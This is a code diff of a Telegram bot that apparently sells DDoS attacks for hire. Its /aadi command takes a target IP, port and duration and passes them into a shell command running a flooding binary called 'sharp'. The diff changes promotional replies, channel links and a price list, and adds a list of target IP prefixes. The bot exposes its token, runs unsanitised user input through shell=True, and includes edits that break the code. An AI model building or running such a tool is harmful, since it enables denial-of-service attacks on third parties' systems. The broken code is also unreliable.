@@ -11,6 +11,9 @@ bot = telebot.TeleBot('7799225662:AAFYX1oLc7AEYq1tzHDdmUb4omfgYoNnxqM')
 # Admin user IDs
 admin_id = {"1302320722", "", ""}
 
+cooldown_dict = {}
+start_attack_reply = {}
+valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '100.', '235.', '91')
 
 USER_FILE = "users.txt"
 LOG_FILE = "log.txt"
@@ -93,7 +96,7 @@ def add_user(message):
             else:
                 response = "ᴜsᴇʀ ᴀʟʀᴇᴀᴅʏ ɪɴ ʙᴏᴛ✔️."
         else:
-            response = "ᴇɴᴛᴇʀ ɴᴇᴡ ᴜsᴇʀ ɪᴅ🗿."
+            response = "ᴇɴᴛᴇʀ ɴᴇᴡ ᴜsᴇʀ ɪᴅ 🕊️."
     else:
         response = "ᴏɴʟʏ ғᴏʀ ᴀᴅᴍɪɴ ❗."
 
@@ -200,7 +203,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f" 🚀𝐀𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐫𝐭𝐞𝐝 𝐨𝐧🥶\n🎯𝐈𝐏:{target} \n⛱️️𝙋𝙤𝙧𝙩:{port} \n⌚𝐓𝐢ᴍᴇ:{time}\n JOIN OUR CHANNEL 👇🏻\n᚛ https://t.me/+KWXSknpfd4w2NmJl ᚜"
+    response = f"*💀 ⚠️𝐀𝐓𝐓𝐀𝐂𝐊 𝐑𝐔𝐍𝐍𝐈𝐍𝐆❗ 💀*\n💢 *ꜱɪɢᴍᴀ ꜱᴛʀɪᴋᴇ ɪɴ ᴇꜰᴇᴇᴄᴛ!* 💢\n🎯 ᴛᴀʀɢᴇᴛ ꜱᴇᴛ: {ip}:{port}*\n⏳ᴅᴜʀᴀᴛɪᴏɴ ʟᴏᴄᴋᴇᴅ: {time} seconds*\n🔥ᴜɴʟᴇᴀꜱʜɪɴɢ ꜰᴏʀᴄᴇ. ɴᴏ ᴛᴜʀɴɪɴɢ ʙᴀᴄᴋ. Powered by 💥*\nhttps://t.me/user_x_dead"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /aadi command
@@ -236,13 +239,13 @@ def handle_aadi(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./sharp {target} {port} {time} 975"
                 subprocess.run(full_command, shell=True)
-                response = f"🚀ᴀᴛᴛᴀᴄᴋ ᴏɴ➡️ {target}:{port} \n💘ᴄᴏᴍᴘʟᴇᴛᴇ ✅ sᴜᴄᴄᴇssғᴜʟʟʏ🔊️\n https://t.me/+KWXSknpfd4w2NmJl"
+                response = f"🚀ᴀᴛᴛᴀᴄᴋ ᴏɴ➡️ {target}:{port} \nᴄᴏᴍᴘʟᴇᴛᴇ 🥂 sᴜᴄᴄᴇssғᴜʟʟʏ✅\n https://t.me/user_x_dead"
         else:
-            response = "ᴜsᴀɢᴇ✅ :- /aadi <target> <port> <time>\nhttps://t.me/+KWXSknpfd4w2NmJl "  # Updated command syntax
+            response = "ᴜsᴀɢᴇ✅ :- /aadi <target> <port> <time>\nhttps://t.me/user_x_dead "  # Updated command syntax
 
 
     else:
-        response = "ABHI FREE SEVA BAND HA THORA WAIT KARO \nhttps://t.me/user_x_dead 🕊️"
+        response = "𝐀𝐛𝐡𝐢 𝐒𝐚𝐦𝐚𝐣 𝐒𝐞𝐯𝐚 𝐁𝐚𝐧𝐝 𝐇𝐚 𝐓𝐡𝐨𝐫𝐚 𝐖𝐚𝐢𝐭 𝐊𝐚𝐫𝐨..!  \nhttps://t.me/user_x_dead 🕊️"
 
 
     bot.reply_to(message, response)
@@ -279,7 +282,7 @@ def show_help(message):
  /plan : ʙᴜʏ ғʀᴏᴍ ᴀᴅᴍɪɴ ✓\n
 
  To See Admin Commands:
- /admincmd : ᴏɴʟʏ ғᴏʀ ᴀᴅᴍɪɴ 😎.
+ /admincmd : ᴏɴʟʏ ғᴏʀ ᴀᴅᴍɪɴ 👑.
  '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -294,7 +297,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"ᴍᴏsᴛ ᴡᴇʟᴄᴏᴍᴇ ɪɴ ᴘʀɪᴠᴀᴛᴇ ᴅᴅᴏs ᴜsᴇʀ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ➡️: /help \n\nhttps://t.me/user_x_dead"
+    response = f"ᴍᴏsᴛ ᴡᴇʟᴄᴏᴍᴇ ɪɴ ᴘʀɪᴠᴀᴛᴇ ᴅᴅᴏs ᴜsᴇʀ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ➡️: /help \n\nhttps://t.me/+KWXSknpfd4w2NmJl"
     bot.reply_to(message, response)
 
 
@@ -319,7 +322,7 @@ Vip :
 ᴘʀɪᴄᴇ ʟɪsᴛ :-\n
 ᴏɴᴇ ᴅᴀʏ :-100ʀs
 ᴏɴᴇ ᴡᴇᴀᴋ :- 500
-ᴏɴᴇ ᴍᴏɴᴛʜ :- 1500'''
+ᴏɴᴇ ᴍᴏɴᴛʜ :- 𝐀𝐔𝐓𝐀𝐓 𝐌𝐄'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['admincmd'])
@@ -333,7 +336,6 @@ def welcome_plan(message):
 /logs : ᴀʟʟ ᴜsᴇʀ ʟᴏɢs.
 /clearlogs : ᴄʟᴇᴀʀ ʟᴏɢ ғɪʟᴇ.
 /setexpire : sᴇᴛ ᴜsᴇʀ ᴛɪᴍᴇ
-https://t.me/user_x_dead
 '''
     bot.reply_to(message, response)
 
